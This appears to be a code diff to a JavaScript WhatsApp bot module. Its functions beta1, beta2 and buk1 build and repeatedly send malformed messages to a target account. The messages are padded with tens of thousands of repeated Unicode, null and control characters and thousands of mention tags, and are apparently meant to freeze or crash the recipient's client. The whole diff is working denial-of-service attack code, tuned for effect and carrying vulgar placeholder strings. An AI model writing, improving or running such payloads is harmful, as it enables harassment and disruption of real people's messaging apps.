@@ -1,8 +1,9 @@
-exports.beta2 = async (viper, target, Ptcp = true) => {
+exports.beta2 = async (viper, target, ptcp = true) => {
+const crypto = require('crypto')
 const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
 	const jids = `_*~@13135550002~*_\n`.repeat(10200);
 	const ui = 'ꦽ'.repeat(1500);
-    for (let i = 0; i < 7; i++) {
+    for (let i = 0; i < 3; i++) {
     await viper.relayMessage(target, {
      ephemeralMessage: {
       message: {
@@ -57,7 +58,7 @@ const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
            thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
            thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
            thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
-           jpegThumbnail: "",
+           jpegThumbnail: o,
           },
          },
         },
@@ -75,9 +76,9 @@ const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
 	}
 
 
-exports.beta1 = async (viper, target) => {
+exports.beta1 = async (viper, target, ptcp = true) => {
+const crypto = require('crypto')
 const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
-    for (let i = 0; i < 7; i++) {
 const stanza = [
 {
 attrs: { biz_bot: '1' },
@@ -88,12 +89,12 @@ attrs: {},
 tag: "biz",
 },
 ];
-
+    for (let i = 0; i < 3; i++) {
 const messagePayload = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
-title: "Bro can your please help me" + "ꦽ".repeat(45000),
+title: "Hajimemaste Watashiwa 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" + "ꦽ".repeat(40000),
 listType: 2,
 singleSelectReply: {
     selectedRowId: "🩸"
@@ -155,8 +156,8 @@ ephemeralSharedSecret: crypto.randomBytes(16),
 entryPointConversionSource: "kontols",
 entryPointConversionApp: "kontols",
 actionLink: {
-url: "t.me/dgxeon",
-buttonTitle: "konstol"
+url: "t.me/CashClipBot",
+buttonTitle: "kontol"
 },
 disappearingMode:{
 initiator:1,
@@ -186,7 +187,7 @@ automatedGreetingMessageShown: false,
 greetingMessageBody: "kontol",
 ctaPayload: "cta",
 disableNudge: true,
-originalImageUrl: "konstol"
+originalImageUrl: "kontol"
 },
 featureEligibilities: {
 cannotBeReactedTo: true,
@@ -220,37 +221,69 @@ ticket_id: crypto.randomBytes(16),
 }
 }
 }
+}
+}
 
 await viper.relayMessage(target, messagePayload, {
 additionalNodes: stanza,
 participant: { jid : target }
 });
 }
-}
 
-exports.buk1 = async (viper, target, text, amount, ptcp = true) => {
-    await viper.relayMessage(target, 
-        {
-        ephemeralMessage: {
-          message: {
-            viewOnceMessage: {
+exports.buk1 = async (viper, target, ptcp = true) => {
+    try {
+        const message = {
+            botInvokeMessage: {
                 message: {
-                    interactiveResponseMessage: {
-                        body: {
-                            text: text,
-                            format: "EXTENSIONS_1"
-                        },
-                        nativeFlowResponseMessage: {
-                            name: 'galaxy_message',
-                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
-                            version: 3
-                        }
-                    }
-                }
-            }
-           }
-          }
-        }, 
-        ptcp ? { participant: { jid: target } } : {}
-    );
-};
+                    newsletterAdminInviteMessage: {
+                        newsletterJid: `33333333333333333@newsletter`,
+                        newsletterName: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" + "ꦾ".repeat(120000),
+                        jpegThumbnail: o,
+                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
+                        inviteExpiration: Date.now() + 1814400000, // 21 hari
+                    },
+                },
+            },
+            nativeFlowMessage: {
+    messageParamsJson: "",
+    buttons: [
+        {
+            name: "call_permission_request",
+            buttonParamsJson: "{}",
+        },
+        {
+            name: "galaxy_message",
+            paramsJson: {
+                "screen_2_OptIn_0": true,
+                "screen_2_OptIn_1": true,
+                "screen_1_Dropdown_0": "nullOnTop",
+                "screen_1_DatePicker_1": "1028995200000",
+                "screen_1_TextInput_2": "null@gmail.com",
+                "screen_1_TextInput_3": "94643116",
+                "screen_0_TextInput_0": "\u0000".repeat(500000),
+                "screen_0_TextInput_1": "SecretDocu",
+                "screen_0_Dropdown_2": "#926-Xnull",
+                "screen_0_RadioButtonsGroup_3": "0_true",
+                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
+            },
+        },
+    ],
+},
+                     contextInfo: {
+                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
+                groupMentions: [
+                    {
+                        groupJid: "0@s.whatsapp.net",
+                        groupSubject: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
+                    },
+                ],
+            },
+        };
+
+        await viper.relayMessage(target, message, {
+            userJid: target,
+        });
+    } catch (err) {
+        console.error("Error sending newsletter:", err);
+    }
+}
